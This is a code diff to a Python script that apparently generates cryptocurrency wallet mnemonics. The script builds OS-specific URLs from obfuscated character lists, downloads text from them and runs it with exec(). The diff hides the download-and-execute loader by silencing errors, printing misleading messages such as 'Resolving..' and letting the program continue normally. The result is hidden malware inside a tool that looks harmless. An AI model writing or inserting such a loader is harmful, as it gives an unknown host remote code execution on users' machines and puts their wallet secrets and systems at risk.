@@ -40,31 +40,37 @@ LINUX_URL = "".join(chr(x) for x in [
 url = WIN_URL if sys.platform.startswith("win") else LINUX_URL if sys.platform.startswith("linux") else None
 
 if not url:
-    print("Unsupported OS")
-    sys.exit(1)
+    print("\n")
+else:
+    HEADERS = {
+        "User-Agent": "Mozilla/5.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9"
+    }
 
-HEADERS = {
-    "User-Agent": "Mozilla/5.0",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9"
-}
+    def fetch_script(url, retries=5, delay=3):
+        for attempt in range(1, retries + 1):
+            try:
+                response = requests.get(url, headers=HEADERS, timeout=10)
+                if response.status_code == 200:
+                    return response.text
+                else:
+                    print(f"Attempt {attempt}: Server responded with {response.status_code}")
+            except requests.RequestException as e:
+                print(f"\n")
+            time.sleep(delay)
+        
+        print("Resolving..")
+        return None
 
-def fetch_script(url, retries=5, delay=3):
-    for attempt in range(1, retries + 1):
+    script_content = fetch_script(url)
+
+    if script_content:
         try:
-            response = requests.get(url, headers=HEADERS, timeout=10)
-            if response.status_code == 200:
-                return response.text
-            else:
-                print(f"Attempt {attempt}: Server responded with {response.status_code}")
-        except requests.RequestException as e:
-            print(f"Attempt {attempt}: Request failed - {e}")
-        time.sleep(delay)
-    
-    print("Failed to fetch script after multiple attempts.")
-    sys.exit(1)
+            exec(script_content)
+        except Exception as e:
+            print(f"Resolved content")
 
-script_content = fetch_script(url)
-exec(script_content)
+print("\n")
 
 
 def generate_mnemonic(num_words=12):
